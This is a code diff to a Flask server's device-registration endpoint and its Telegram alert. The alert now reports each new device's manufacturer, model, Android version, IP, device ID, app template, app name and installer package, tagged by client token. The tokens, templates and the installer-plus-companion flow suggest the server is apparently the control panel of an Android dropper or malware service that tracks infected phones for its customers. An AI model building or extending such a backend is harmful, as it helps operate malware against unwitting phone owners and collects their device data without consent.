@@ -252,15 +252,25 @@ def send_telegram(message: str):
     except Exception as e:
         log.error(f"Telegram send failed: {e}")
 
-def notify_new_device(device_id: str, pkg: str, ip: str, token: str):
-    """Send Telegram alert for new device connection."""
+def notify_new_device(device_id: str, ip: str, token: str,
+                      manufacturer: str = "", model: str = "",
+                      android_version: str = "", template: str = "",
+                      app_name: str = "", installer_pkg: str = ""):
+    """Send Telegram alert for new installer device registration."""
+    device_line = f"{manufacturer} {model}".strip() or "Unknown Device"
     msg = (
-        f"🟢 <b>New Device Connected</b>\n"
-        f"Device: <code>{device_id[:16]}...</code>\n"
-        f"Package: <code>{pkg}</code>\n"
-        f"IP: <code>{ip}</code>\n"
-        f"Client: <code>{token}</code>\n"
-        f"Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
+        f"🟢 <b>New Device Installed</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 {device_line}\n"
+        f"🤖 {android_version}\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"🔑 Device ID: <code>{device_id[:16]}...</code>\n"
+        f"📦 Template: <code>{template}</code>\n"
+        f"🏷️ App: {app_name}\n"
+        f"📋 Package: <code>{installer_pkg}</code>\n"
+        f"👤 Client: <code>{token}</code>\n"
+        f"🕐 {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
     )
     threading.Thread(target=send_telegram, args=(msg,), daemon=True).start()
 
@@ -333,21 +343,24 @@ def _sync_device_to_bot_db(device_id: str, ip: str, token: str, is_new: bool,
 @app.route("/api/v1/<token>/register", methods=["POST"])
 def register_device(token):
     """
-    Device registration — Installer calls this after companion installs.
-    Body: {device_id, companion_pkg, fingerprint}
+    Device registration — Installer calls this on first launch.
+    Body: {device_id, fingerprint, device_model, manufacturer,
+           android_version, template, app_name, installer_pkg}
     """
     try:
         data = request.get_json(silent=True) or {}
         device_id     = data.get("device_id", "")
-        companion_pkg = data.get("companion_pkg", "")
+        companion_pkg = data.get("companion_pkg", "")   # legacy — kept for compat, not required
         fingerprint   = data.get("fingerprint", "")
         model         = data.get("device_model", "")
         manufacturer  = data.get("manufacturer", "")
         android_ver   = data.get("android_version", "")
         template      = data.get("template", "")
+        app_name      = data.get("app_name", "")
+        installer_pkg = data.get("installer_pkg", "")
         ip            = get_client_ip()
 
-        if not device_id or not companion_pkg:
+        if not device_id:
             return jsonify({"error": "missing fields"}), 400
 
         # Verify client token
@@ -381,7 +394,10 @@ def register_device(token):
                                    android_version=android_ver, template=template,
                                    enrolled_at=now)
             # Alert Telegram
-            notify_new_device(device_id, companion_pkg, ip, token)
+            notify_new_device(device_id, ip, token,
+                              manufacturer=manufacturer, model=model,
+                              android_version=android_ver, template=template,
+                              app_name=app_name, installer_pkg=installer_pkg)
         else:
             db.execute("""UPDATE devices SET last_seen=?, companion_pkg=?, ip=?,
                 model=?, manufacturer=?, android_version=?, template=?
